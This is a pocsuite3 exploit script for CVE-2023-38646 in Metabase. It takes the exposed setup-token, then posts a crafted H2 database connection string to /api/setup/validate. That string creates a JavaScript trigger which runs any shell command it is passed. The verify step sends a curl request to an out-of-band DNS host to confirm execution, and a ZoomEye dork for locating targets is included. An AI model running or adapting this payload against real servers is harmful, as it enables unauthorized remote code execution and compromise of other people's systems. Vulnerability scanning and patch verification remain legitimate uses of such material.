from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from urllib.parse import urljoin

minimum_version_required('1.9.11')


class POC(POCBase):
    name = 'Metabase-远程代码执行-CVE-2023-38646'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': 'app:"Metabase"'}
    vulID = '-'
    appVersion = '-'
    appName = 'Metabase'

    def _exploit(self, param=''):
        url = urljoin(self.url, '/api/session/properties')
        url1 = urljoin(self.url, '/api/setup/validate')
        res = requests.get(url, verify=False, timeout=5)
        if res.status_code == 200 and "application/json" in res.headers['Content-Type']:
            json_data = res.json()
            if "setup-token" in json_data and json_data["setup-token"] is not None:
                token = json_data['setup-token']
                payload = {
                    "token": token,
                    "details": {
                        "is_on_demand": False,
                        "is_full_sync": False,
                        "is_sample": False,
                        "cache_ttl": None,
                        "refingerprint": False,
                        "auto_run_queries": True,
                        "schedules": {},
                        "details": {
                            "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('{param}')\n$$--=x",
                            "advanced-options": False,
                            "ssl": True
                        },
                        "name": "test",
                        "engine": "h2"
                    }
                }

                res1 = requests.post(url1, json=payload, verify=False, timeout=5)
                if "Error creating or initializing trigger" in res1.text:
                    retoken = {"token": token}
                    return retoken['token']

    def _verify(self):
        result = {}
        random_uri = random_str(6)
        oob = CEye()
        v = oob.build_request(value=random_uri,type='dns')
        url, flag = v['url'], v['flag']
        param = f"curl {url}"
        res = self._exploit(param)
        if oob.verify_request(flag=random_uri,type='dns'):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
            result['VerifyInfo']['Command'] = param
            result['VerifyInfo']['setup_token'] = res
            return self.parse_output(result)


register_poc(POC)
